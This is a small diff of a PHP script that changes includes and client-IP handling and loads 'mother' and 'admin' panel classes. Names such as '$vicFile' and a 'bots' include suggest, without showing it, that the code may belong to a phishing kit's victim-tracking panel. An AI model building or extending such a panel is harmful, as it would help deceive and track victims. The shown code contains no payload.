@@ -7,15 +7,14 @@
 ***************************************************/
 
 @session_start();
-// require (__DIR__).'/bots/father.php';
+
+require (__DIR__).'/test_config.php';
+
  $ajaxPath = "../panel/classes/processor.php";
 require (__DIR__).'/panel/classes/mother.class.php';
 require (__DIR__).'/panel/classes/admin.class.php';
 $admin_json_file = (__DIR__).'/panel/data/admin.json';
-$ip = $_SERVER['REMOTE_ADDR'];
-if($ip=="::1"){
-	$ip="127.0.0.1";
-}
+$ip = getRealClientIP();
 
 $m = new Mother;
 $vicFile = $m->getFileId();
